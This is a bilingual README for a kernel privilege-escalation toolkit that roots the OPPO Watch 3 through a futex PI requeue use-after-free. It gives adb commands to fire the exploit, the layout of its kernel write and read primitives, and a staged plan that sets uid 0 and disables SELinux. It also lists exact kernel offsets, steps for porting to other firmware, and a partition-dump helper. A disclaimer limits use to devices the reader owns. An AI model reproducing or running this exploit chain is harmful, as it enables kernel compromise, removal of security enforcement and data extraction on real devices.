# OPPO Watch 3 (OWW212) GhostLock Root

> **English (TL;DR)** — A working local privilege-escalation toolkit for the **OPPO
> Watch 3 / model `OWW212`** (Snapdragon W5, Android 11, kernel
> `5.4.134-perf-00522-gb29f81177a79`, ARM 32-bit, no KASLR). It ports
> **GhostLock (CVE-2026-43499)** — a `FUTEX_WAIT_REQUEUE_PI` stack use-after-free —
> to this kernel and runs a state machine of controlled kernel writes **inside a
> single boot** to reach `uid=0` + SELinux permissive, then leaves a root shell
> listening on the watch's `127.0.0.1:25555`, reached through `adb forward`.
> **No bootloader unlock, no flashing, no data wipe.** Root lasts until reboot.
>
> **中文** — 面向**你自己拥有**的 OPPO Watch 3（OWW212）的内核提权工具包。把
> GhostLock（CVE-2026-43499，futex PI requeue 造成的栈 UAF）移植到这颗 ARM32
> 内核上，在**同一次开机内**连续落地受控内核写，拿到 `uid=0` 与 SELinux
> permissive，并在手表的 `127.0.0.1:25555` 留下 root shell（经 `adb forward`
> 连接）。**不解锁 bootloader、不刷机、不清数据**，重启后失效。

---

## 0. 使用前必须知道的三件事

1. **只用于你自己拥有的设备。** 解锁 bootloader 在 OWW212 上是**不可恢复的变砖**
   （fastboot 无法刷回，只能返厂）。本工具**完全不碰 bootloader**，`/proc/cmdline`
   里的 `androidboot.vbmeta.device_state=locked` 全程保持 `locked`。
2. **内核 panic / 走链挂死是常态，不是损坏。** 每一次"打孔"都要重走一遍 PI 链，残留的
   ghost waiter 可能被任何任务踩到；实测**失败是按孔数逐个掷骰子**（一枪需要 13 个孔），
   所以 `root.bat` 会跨开机自动重试（最多 6 次；今天实测在第 5 次成功）。panic 约 90 秒后
   自动恢复，不丢数据；如果只是挂死（adb 连着但 shell 不响应），长按侧键约 15 秒强制重启
   即可。崩溃签名通常是：
   `Unable to handle kernel NULL pointer dereference at virtual address 00000000`，
   `PC is at _raw_spin_trylock+0x20`，`LR is at rt_mutex_adjust_prio_chain+0x120`。
3. **拿到 root 之后：不要拔充电器、不要 kill/restart adbd。** 这两种动作都会拆除
   fire 进程所在的进程组，触发 futex/PI 清理 → 立刻 panic。收尾请用软重启（见 §6）。

---

## 1. 环境要求

| 项目 | 要求 |
| --- | --- |
| 设备 | OPPO Watch 3 `OWW212`，已验证固件 `OWW212_11_A.142`，bootloader **保持锁定** |
| 主机 | Windows（`root.bat`）或任何有 bash 的系统（`rootrun.sh` / `rootnow.sh`） |
| adb | `C:\platform-tools\adb.exe`（路径可在 `root.bat` / `rootsh.py` 顶部改） |
| Python | 3.x，仅用于 attach 脚本，无第三方依赖 |
| 编译（可选） | Android NDK r29，只用于重新编译 `exploit/`（`bash build_arm32.sh`） |

USB 调试开启即可，**不需要** root、不需要解锁、不需要 Recovery。

---

## 2. 快速开始（Windows）

```bat
root.bat            :: 全自动：重启手表 -> 等待安静 -> 开火 -> 失败换下次开机（最多 6 次）
root.bat --cmd id   :: 同上，但只跑一条命令并打印结果，不进交互
root.bat --attach   :: 附加到已经存在的 root shell；若本次开机没 root，会自动改为开火
root.bat --check    :: 只检查 adb / python / 产物，绝不开火
```

成功时的样子：

```
[ok] ROOT - SELinux is Permissive and a root shell listens on port 25555
--- interactive root shell (Ctrl-C to leave; the daemon stays up) ---
OWW212:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb), ...
```

命令行方式（脚本化时更稳）：

```bat
python rootsh.py "getenforce" "ls -l /data/system"
python rootcmd.py 30 "cat /proc/self/status"     :: 单条命令 + 等结束标记，适合长输出
```

### Linux / macOS

```bash
bash rootrun.sh --keep "id|head -1" "getenforce"   # 开火 + 跑批 + 保留 root
bash rootrun.sh "id" "getenforce"                  # 同上，用完自动 sysrq 重启收尾
```

---

## 3. 手动开火（不依赖任何脚本，4 条命令）

每次都要用**新的 .so 文件名**：panic 可能污染正在使用的目录项，之后连 `rm` 都会
返回 `EACCES`。

```bat
cd C:\platform-tools
adb push <repo>\exploit\preload.so /data/local/tmp/g1.so
adb shell "printf '#!/system/bin/sh\nexport LD_PRELOAD=$GFSO\nexec /system/bin/toybox true\n' > /data/local/tmp/f.sh; chmod 755 /data/local/tmp/f.sh"
adb shell "GFSO=/data/local/tmp/g1.so GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh /data/local/tmp/f.sh"
```

第 3 条会**故意阻塞**——它就是被提权的那个进程，关掉它就会拆掉 root（并可能 panic）。
再开一个窗口：

```bat
adb shell getenforce                          :: Permissive
adb forward tcp:25555 tcp:25555
python rootsh.py "id"
```

---

## 4. 它是怎么工作的

上游 GhostLock 提供漏洞本身；这个项目提供的是**在这颗没有 KASLR 的 ARM32 可穿戴
内核上，把一个不可靠的 UAF 变成可重复使用的原语，并在一次开机内编排完所有写**。

### 4.1 漏洞与写原语

`FUTEX_WAIT_REQUEUE_PI` 在一个已释放的内核栈页上留下 `rt_mutex_waiter` 幽灵。
随后 `sys_sched_setattr → rt_mutex_adjust_pi → rt_mutex_adjust_prio_chain →
rb_erase(ghost)` 会按幽灵节点里的指针执行写。我们把幽灵的字段摆成：

```
[pc] = W - 4      [rb_right] = V      [rb_left] = 0
```

于是一次"打孔"（punch）产生两个写：

```
S1 = *(W) = V          // 存储地址 = ((W-4) & ~3) + 4
S2 = *(V) = W - 4      // 仅当 V != 0
```

关键推论：**写入的值必须是一个 4 字节对齐、可写的内核地址**，因此 capability 的
bit0/bit1（`CAP_CHOWN`、`CAP_DAC_OVERRIDE`）**永远无法被直接盖章**。
`GHOSTLOCK_WBASE=4` 是在这块板上实测出来的幽灵在栈页内的偏移。

### 4.2 读原语

把 `init_nsproxy.uts_ns` 这个槽（`0xc1a1741c`）重定向到 `A - 4`，`uname()` 就会
从 `A` 起 memcpy 6×65 = **390 字节裸内存**（无 NUL 处理）。所有进程共享
`&init_nsproxy`，所以这是一个任意内核读通道。

### 4.3 一次开机内的完整程序（`exploit/src/fops.c` 的 `uw_*`）

```
stage 0   读 init_task+0x460 (tasks)      -> tasks.prev = 最新任务的节点
stage 1   读 task+0x61c                   -> real_cred / cred / comm（+0x628）
stage 7   写 0 到 task+0x618              -> 复位被 S2 顺带破坏的 last_siginfo
stage 2   读 cred 本体                    -> 校验 uid==2000 && gid==2000 是"我们的"cred
stage 3   写 0 到 selinux_state           -> permissive
stage 4   写 0 到 cred+{04,08,0c,10,14,18,1c,20}   -> uid/gid/suid/sgid/euid/egid/fsuid/fsgid
stage 5   (默认跳过) 盖章 cred+{30..47} capability
stage 6/8 getuid()==0 ? 否则重发（每步都幂等）；然后把 uts_ns 槽写回 init_uts_ns
finish    fork 出 detached root shell，监听 127.0.0.1:25555
```

**capability 盖章默认不做**（`GHOSTLOCK_STAT_NOCAPS=0` 可打开）：盖章值必须是"4 字节
对齐且可写的内核地址"，所以它永远带不上 `CHOWN`/`DAC_OVERRIDE`，而实际使用的那个值连
`SYS_ADMIN`/`NET_ADMIN` 都没有——花 6 次走链换不到任何东西。真正的检查是 `getuid()`，
它不消耗打孔。因此整条链是 **13 个孔**：head + task + repair + cred + permissive +
8×id + restore-uts。

**守护监听在 uid 变成 0 的那一刻就先起来**（在 restore-uts 之前）。因为剩下的失败模式
是"某个孔卡在 PI 走链里"（实测：13:08 那枪卡在第 22 个孔、此时 uid 已经是 0；13:15 那
枪卡在第 6 个孔），先起监听意味着即使随后挂死，你手上仍然有一个可用的 root shell。

程序**不退出**（`GHOSTLOCK_STAY=1`）：实测 fire 进程退出时的 futex/PI 清理正是
panic 的高发点。

### 4.4 本固件上的偏移表（`OWW212_11_A.142` / `5.4.134-perf-00522`）

```
_text                 0xc0008000   (no KASLR, slide 恒为 0)
init_task             0xc1a112c0   tasks=+0x460 (next@+0, prev@+4)
init_nsproxy          0xc1a17418   uts_ns 槽 = +0x4 -> 0xc1a1741c
init_uts_ns           0xc1a110a0
init_cred             0xc1a174d0
selinux_state         0xc1d5a720   (20 字节，最后一个 .bss 对象，_end=0xc1d5a734)
cred 内 real_cred/cred/comm  task+0x61c / +0x620 / +0x628
cred 内 uid..fsgid    +0x04..+0x20 ；capability 字 +0x30..+0x47
```

> ⚠️ **别照抄任何 kallsyms 文本。** 本项目曾生成过一份名字与地址**错位**的
> `sysmap`（`_end` 只比 `selinux_state` 大 1 字节，明显不可能）。上表全部是在设备上
> 用读通道验证过的值。换固件时，用 `exploit/tools/extract_kallsyms.py` +
> `exploit/tools/sysmap_fill.py` 重算，再按 §7 的顺序在设备上验证。

---

## 5. 这个 root 能做什么、不能做什么

**能**

- `uid=0`，SELinux **permissive**（本次开机内有效）
- 读 root 属主的文件、写 `/proc/sys/**`、向任意 uid0 进程发信号 / ptrace
- 通过守护进程跑任意命令、dd 分区镜像（`dump_via_root.sh` 是现成例子）

**不能**

- **没有 `CAP_DAC_OVERRIDE` / `CAP_CHOWN`**：见 §4.1，存储值的低 2 位恒为 0。所以
  uid0 也读不了 `0600 system:system` 的 `/data/system/packages.xml`，也不能在
  `0771 shell:shell` 的 `/data/local/tmp` 里创建文件。
- **capability 不跨 execve**：守护进程 exec 出来的 `sh` 显示 `CapEff: 0`（普通非
  setuid 文件的 execve 会把 permitted 清零）。要特权就在 fire 内部做，或依赖 uid0。
- **拿不到 adb root**：这是 user 版 adbd，重启后仍是 uid 2000。root 只走 25555 守护。
- 不落地：不写 /boot、不写 /system、不动 bootloader，重启即回到 Enforcing/uid2000。

---

## 6. 收尾与恢复

```bat
:: 已 root 时，adb reboot 会被 init 拒绝（sys.powerctl -> getpeercon() failed，
:: 正是我们清零 selinux_state 的副作用）。用 sysrq：
python rootcmd.py 25 "sync; sync; echo b > /proc/sysrq-trigger"
```

没 root 时用普通 `adb reboot`。如果表卡住（adb 连着但 shell 不响应），长按侧键约
15 秒强制断电重启即可，**不会丢数据**。

顺带一条常见误判：拿到 root 后"屏幕不亮"不是坏了，而是 `mWakefulness=Asleep`
且侧键发的是 `KEYCODE_F1`。`adb shell input keyevent 224` 唤醒，
`adb shell svc power stayon true` 保持常亮。

---

## 7. 换一颗内核 / 换固件时怎么做

1. 取 `boot.img` 的 `Image`，跑 `exploit/tools/extract_kallsyms.py` 得到符号表，
   再用 `exploit/tools/sysmap_fill.py` 填 `exploit/targets/oppo-oww212/target.h`。
2. **先只验证读通道**：把 `uts_ns` 槽指向一个已知对象，`uname()` 出内容对不对。
3. 再验证写：挑一个无害且可回写的内核写目标（本项目用 sysctl 的 `optmem_max`），
   反复打同一个孔，确认 `S1` 落地。
4. 实测 `GHOSTLOCK_WBASE`（幽灵在栈页内的偏移）——这是唯一必须"试"出来的量。
5. 结构偏移（`tasks`/`cred`/`comm`）用反汇编确认，不要靠"看起来像"。
6. 判断 CVE 是否适用：查上游补丁的 `Fixes:` 标签 + 本地源码是否真有该代码路径。

---

## 8. 目录结构

```
root.bat                    Windows 一键：重启->等安静->开火->重试(<=6)->attach
rootrun.sh                  bash 版一键（推荐在非 Windows 上用）
rootnow.sh / rootsh.py      开火 / attach；rootcmd.py 单条命令 + 结束标记
dump_via_root.sh            经守护进程 dd 分区再 adb pull
build_arm32.sh              NDK 交叉编译 exploit/ -> exploit/preload.so
exploit/src/                主体：fops.c（GhostLock 移植 + uw_* 单开机程序）
exploit/targets/oppo-oww212/target.h   本固件的符号与偏移
exploit/tools/              extract_kallsyms.py / sysmap_fill.py 等离线分析工具
docs/                       完整中文技术报告（原理 / 代码 / 日志 / 反汇编）
```

---

## 9. 故障对照（全部来自实测）

| 现象 | 真正原因 | 处理 |
| --- | --- | --- |
| `root.bat --attach` 说没有守护 | **`--attach` 本来不开火**；本次开机没 root（或表已重启） | 直接跑 `root.bat` |
| 日志停在 `no-KASLR target`，连 `UW start` 都没有 | 在开机第 0 分钟开火，只剩 5–11 MB 空闲，**lowmemorykiller 杀了 fire** | 已修：等过第 1 分钟再静置 |
| 第一个孔就崩 / 走到第 N 个孔卡住不动 | 每个孔都要重走 PI 链，**挂死与崩溃都是按孔数逐个掷骰子**（实测有卡在第 6 孔、也有卡在第 22 孔的）。低负载（<9）有助于提高命中率但不是决定因素 | 换下次开机重试；`root.bat` 会自己重试 6 次 |
| 猎杀反复"not ours" | 尾部被 LMK 重启的应用/kworker 占了 | 已修：沿 `tasks.prev` 回走 + 诱饵线程 |
| 明明找到 cred 却判定失败、白烧十几个孔 | **存储偶尔不落地**，`uname()` 读到的是上一格的旧窗口 | 已修：窗口逐字节相同即判 stale，只重发同一步 |
| `SKIP single-flight` | 上一个 fire（`STAY=1` 不退出）还占着 `/data/local/tmp/ghostlock.lock` | **别 kill 它**，重启表即可 |
| 已 root 时 `adb reboot` 无反应 | init 拒绝 `sys.powerctl`（`getpeercon() failed`） | 用 §6 的 sysrq |
| `push` 成功但执行报 `EACCES` | panic 污染了该文件名的目录项 | 换一个**新文件名**，别复用 |
| MSYS/Git-Bash 下 `adb push /c/...` 失败 | `MSYS_NO_PATHCONV=1` 关了路径转换 | 传 Windows 风格路径 `C:\...` |

---

## 10. 免责声明

仅面向**你合法拥有**的设备做互操作与安全研究。作者不提供任何担保；使用造成的
一切后果（包括设备不可用）由使用者自行承担。请通过正常渠道向厂商披露相关漏洞。

## 11. License

MIT（见 `LICENSE`）。上游漏洞信息见 CVE-2026-43499（GhostLock）。
